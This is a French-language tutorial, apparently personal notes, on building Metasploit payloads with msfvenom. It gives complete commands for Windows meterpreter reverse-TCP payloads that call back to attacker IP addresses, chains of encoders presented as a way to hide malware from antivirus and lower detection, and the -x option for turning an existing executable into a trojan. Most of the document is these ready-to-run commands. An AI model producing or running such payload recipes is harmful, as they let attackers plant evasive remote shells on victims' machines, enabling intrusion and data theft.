# <div align="center">Créer payload avec MSFVenom</div>

-----------------------------------------
#### Tuto youtube[](https://www.youtube.com/watch?v=Ah5aq7w_LHk)

#### Lien vers Cheat Sheet[](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)
####  ---  Lien utile [ici](https://netsec.ws/?p=331) ---
### Exemple pour Windows :

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=4444 -e cmd/powershell_base64 -i 10 -a x64 --platform windows -f raw | sudo msfvenom -a x64 --platform windows -e cmd/echo -i 10 -f raw |sudo msfvenom -a x64 --platform windows -e cmd/perl -i 10 -f exe -o hello_world.exe
```


## A noter :

Staged payloads are denoted with the use of a forward slash (**/**; e.g. **windows/shell/reverse\_tcp**). Staged payloads send a small stager to the target, which connects back to the attacker and downloads the rest of the payload. Therefore, staged payloads need special payload listeners, such as **multi/handler** in Metasploit. Staged payloads are ideal in situations where you have limited shellcode space, most commonly in Buffer Overflows (but that’s a story for another day).

Stageless payloads are denoted with the use of an underscore (**\_**; e.g. **windows/shell\_reverse\_tcp**). Stageless payloads send the entire payload to the target at once, and therefore don’t require the attacker to provide more data. That means we have a variety of listeners we can use, such as Netcat. [](https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86)

## BASE -> Pour un Reverse TCP :
```bash
msfvenom -p [nom_du_payload_reverseTCP] LHOST=[IP_Attaquant] LPORT=[Port_attaquant] -f [format_final] -a [architecture_de_la_victime] --platform [OS_victime] -e (optionnel) [type_d_encodage] -i [int_du_nb_d_iteration_d_encodage] -o [path_to_save_the_payload]
```



-f format du payload après sa création. Exemple: .exe / .bat / .py / .aspx 

```bash
msfvenom --list formats
```
	
	
-a architecture du système victime : x86 (32bytes) / x64 

```bash
msfvenom --list archs
```

--platform Plateforme d'OS de la victime 

```bash
msfvenom --list platforms
```

-e Encodage pour dissimuler le malware aux antivirus 

```bash
msfvenom --list encoders
```
	
-i Nombre d'itération à faire pour encoder le payload Ex: 1 / 2 / 10 

## 

## Combinaison d'encodage :
	Utile pour diminuer son ratio de detection
	
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -a x64 --platform windows -e ruby/base64 -i 2 | msfvenom -e cmd/powershell_base64 -i 1 -a x64 --platform windows | msfvenom -e mipsbe/byte_xori -i 1 -a x64 --platform windows -o ~/malware/test.exe -f exe
```

Pour chaque nouvelle itération de " | " il faut respecifier 
-e / -a / -i / --platform

Rajouter -o à la toute fin et si pb, remettre -f

## Ajout de mauvais charactère pour duper les AV :

-b (=bad chararcters) -> Rajoute du texte inutile pour bypass les antivirus 


```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -a x64 --platform windows -e ruby/base64 -i 2 -o ~/malware/test.exe   
-b '\x00\x0a\x0d'
```

Un bad chars et toujours = \ + x + int(0->9) ||letter(a->f) + int(0->9) ||letter(a->f) + \
Les lettres sont toujours de a  à f
	->ex: \x0a\ \xaf\ \xd8
			

## Utilisation avancée :

Dans la cadre de l'utilisation d'un fichier déjà existant qu'il est possible de transformer en malware. L'objectif est d'ajouter le ficher au payload et de le réencoder

-x [path/du/fichier/a/transformer] option pour ajouter notre fichier à modifier

R option sans flag '-' ni rien qui permet de mettre le code en brut.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 --platform windows R | msfvenom -e cmd/powershell_base64 -i 5 --platform windows | msfvenom -x path/to/transform/file -o n/importe/ou -f exe -e ruby/base64 -b '\x00\x0a\x0d' -i 2
```